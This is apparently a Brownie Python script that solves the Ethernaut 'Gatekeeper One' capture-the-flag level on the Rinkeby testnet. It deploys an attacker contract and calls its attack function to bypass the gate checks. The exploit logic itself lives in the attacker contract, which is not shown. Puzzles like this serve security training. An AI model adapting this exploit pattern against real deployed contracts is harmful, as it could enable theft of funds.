from brownie import accounts, GatekeeperOne, GatekeeperOneAttacker

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x8E20605B30Bbc64beCb0595cB2E33A08C175eB71"
gate_keeper = GatekeeperOne.at(instance_address)

# -------------------------------------------------------------------------
# Make it past the gatekeeper and register as an entrant to pass this level.
# -------------------------------------------------------------------------


def level_completed():
    return gate_keeper.entrant() == account.address


def exploit():
    # deploy hacker contract
    hacker = GatekeeperOneAttacker.deploy(instance_address, {"from": account})

    # view entrant variable
    print(gate_keeper.entrant())

    # call attack function in hacker contract
    tx = hacker.attack({"From": account})
    tx.wait(1)

    # confirm we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
